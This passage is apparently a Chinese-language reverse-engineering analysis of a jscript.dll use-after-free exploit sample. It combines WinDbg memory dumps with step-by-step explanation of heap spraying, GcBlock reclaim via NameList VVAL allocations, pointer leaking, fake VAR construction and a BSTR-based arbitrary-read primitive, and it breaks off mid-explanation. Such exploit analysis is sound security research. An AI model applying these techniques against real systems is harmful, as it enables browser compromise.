    0:012> dd ecx L2c/4
    0268cda0  6c4b43e0 0268cd10 0268e914 0268ea1c
    0268cdb0  000000c8 0268daa0 00000000 052eb7dc
    0268cdc0  0268e078 0266cb18 00000000
    0:012> u 6c4b43e0 L1
    jscript!VarStack::`vftable':
    6c4b43e0 bf6f4b6cc1      mov     edi,0C16C4B6Fh
    0:012> dd 052eb7dc
    052eb7dc  0268e008 02690051 0269001c 00000003
    052eb7ec  0268edc0 00000000 00000000 0268e018
    052eb7fc  0269001c 0268e058 052eb8f0 00000000
    052eb80c  0268e018 0268e018 0268e048 0268e088
    052eb81c  052eb908 00000000 0268d0d0 00000000
    052eb82c  00008003 00000000 00000000 00000000
    052eb83c  fffffffe 052eb488 052eb784 ffffffff
    052eb84c  00000080 0266cb18 0268d740 00167af0
    0:012> dd 0268e008
    0268e008  77a80083 00000005 0268d760 77ac57df
    0268e018  02680000 00000006 0062004f 0268e068
    0268e028  00000000 00000000 00000000 00000000
    0268e038  02680080 0268e9f0 0268d720 6c4b10ed
    0268e048  02680000 00000004 00610061 00610061
    0268e058  00000000 00000000 40000000 00843158
    0268e068  00000080 00000000 0268d760 00000000
    0268e078  052ebe1c 0268e0d8 00720065 00000074
    // gcblock
    0:012> dd 0268d720
    0268d720  00000081 00000000 02690078 0268d760
    0268d730  00000881 00000000 0268e9f0 00000000
    0268d740  00000881 00000000 0268e970 00000000
    0268d750  6c4b0887 00000000 045281a0 00000001
    0268d760  00000081 00000000 0268d0d0 0268d780
    0268d770  00000881 00000000 0268e8f0 00000000
    0268d780  00000081 00000000 0268e880 00000000
    0268d790  00000881 00000000 0268e838 00000000
    // NameTbl
    0:012> dd 02690078
    02690078  6c4b1948 00000000 0268ea60 0268cdd8
    02690088  0268d720 ffffffff 0268d790 00000000
    02690098  00000000 6c4b4d1c 0268cd10 00000000
    026900a8  00000000 6c533164 1b1201f4 80000000
    026900b8  00000012 00000000 00000000 00000000
    026900c8  00000000 00000000 00000000 00000000
    026900d8  00000000 00000000 00000000 00000000
    026900e8  00000000 00000000 1b1201fc 80000000
    0:012> u 6c4b1948 L1
    jscript!NameTbl::`vftable':
    // NameList
    0:012> dd 0268ea60 
    0268ea60  6c4b1924 00000001 00000001 0268eb18
    0268ea70  0000003c 00000100 00000100 00004000
    0268ea80  0268eb1c 0268eb3c 0268ead0 0000000f
    0268ea90  00000040 00000001 0000000a 0268eaa0
    0268eaa0  0268eb1c 00000000 00000000 00000000
    0268eab0  00000000 00000000 00000000 00000000
    0268eac0  00000000 00000000 6e35606c 08033201
    0268ead0  00000000 00000000 00000000 00000000
    // vval
    0:012> dd 0268eb1c 
    0268eb1c  00650003 00000077 00000001 40000000
    0268eb2c  00000000 00000000 0007b9e4 00000008
    0268eb3c  00000000 00000000 00000001 00000000
    0268eb4c  00610061 00610061 00000000 00000000
    0268eb5c  00000000 00000000 00000000 00000000
    0268eb6c  00000000 00000000 00000000 00000000
    0268eb7c  00000000 00000000 00000000 00000000
    0268eb8c  00000000 00000000 00000000 00000000
结论是：
  * gcblock.mem[k]指向Object
  * 将 javascript中的变量赋值一个Object，那么这个变量可以理解成一个VAR(0x80, 0, gcblock.mem[k], 0)
因此漏洞中所描述的initial_exploit参数不会被GC跟踪，具体是指上述这样的VAR(0x80)仍然存在，从GC的步骤来描述就是在Scavenge过程中，不会对untracked调用Scavenge，从而GC得出结论认为对象是不可达的，在第三步Reclaim中将Object的内存释放。
## leak_var()
将UAF转化成信息泄露是和CVE-2018-8353一样的方式，可以参考@银雁冰在看雪论坛上对[CVE-2018-8353](https://bbs.pediy.com/thread-257127.htm)的分析  
先补充两个知识点：
  1. 如果一个Object被释放，那么其在GcBlock中的VAR的type会被置0，若一个GcBlock中所有VAR的type都是0，那么这个GcBlock会被释放；
  2. NameList是jscript.dll中的哈希表结构体，Object的属性会被存放在其中，(name, value)会使用VVAL结构体（大小为0x30+name）来组织，NameList会指定一块内存来存放VVAL：（以下均可以逆向NameList::FCreateVval得出）  
1) 如果是第一个VVAL，且name长度合理，按照(2x + 0x32) * 2 + 4的计算公式来申请内存，后面存放的VVAL也会使用这块内存；  
2）name长度过长，只申请这一个VVAL的大小；  
3）多段内存通过第一个dword构成单链表；  
4）VVAL之间通过next域构成单链表（泄露的地址）。
UAF首先需要进行占位，样本中是这样做的，通过大量的new
Object()，此时大量的GcBlock都被Object占满，然后在initial_exploit以递归的方式保存untracked，并在递归深度大于150时释放spray，这样不仅仅Object会被释放，被Object占满的GcBlock也会被释放，然后再使用NameList：：FCreateVval创建特定大小(0x648)的内存对GcBlock进行占位;
untrack被保存至数组total中，因此可以通过total对GcBlock进行访问，这里需要通过深入逆向VVAL的结构体
    struct VVAL
    {
        VAR variant;
        dword;
        dword;
        int hash;
        unsigned int name_length;
        VVAL *next;
        VVAL *next_hashbucket_vval;
        int id_number;
        dword;
        wchar_t name[];
    }
其中有两个dword包含了地址，其中next域通过设置下一个属性是可以稳定泄露指针，为了达成这个目的，需要将hash设置成指定的值
通过逆向函数CaseInsensitiveComputeHashCch可知，如果length为1，且v5-65为负数，那么hash即为字符串本身，样本中将这里布置成0x05，0x05在VAR中代表浮点数。
样本中共布置了4个属性，第一个用于占位GcBlock，第二个用于对齐GcBlock，第三个用于泄露next，第四个VVAL用于给next赋值并通过value表示下标；
这样可以达成地址泄露。
## get_rewirte_offset()与rewrite
**get_rewirte_offset()**
第一次uaf的overlay被保存在了overlay_backup，后面使用initial_exploit进行uaf的overlay与第一次不是同一个，需要知道overlay_backup中哪一个对象命中了地址泄露，样本中采用了和laek_var同样的手法，在第一个VVAL的name域构造大量与GcBlock.mem重叠的VAR，泄露出overlay_backup[offset]中的第四个VVAL,；
**rewrite()**
在知道overlay_backup的下标后，包装出一个修改第四个VVAL的功能，只需要释放对应的Object，然后再new的Object中的布置新内容
## get_fakeobj
通过rewrite和init_exploit，泄露出一个fakeobj_var，这是在第四个VVAL的name域伪造的VAR，这里需要理清楚访问的逻辑
fakeobj_var —> GcBlock（由overlay中的Object导致的占位）—> fake_VAR
即VAR(0x80) —> VAR(0x80) —> fake_VAR
这个过程中只有最终的fake_VAR是可控的
## 任意地址读 原语
如果构造fake_VAR是BSTR，那么通过fakeobj_var进行访问是合法的
考虑一个BSTR的VAR，0x08 0x00 taddr pad，那么可以通过bstr.length实现任意地址读，具体如下：
`bstr.length = (dword)[taddr-4]>>1`
可以看到length会丢失一个比特的内容，下面以读取一个byte为例说明样本中的读取方法
令taddr = addr + 2
则 [taddr-4]会读取addr-2,addr-1,addr,addr+1这4个byte，要想获取addr这个byte可用以下的公式：
(fakeobj.length >> 15) &
0xff，其中addr-2会因为>>1而破坏，addr-2和addr-1都是不需要的，设置一次fake_VAR最多可以读取一个word，addr+1,addr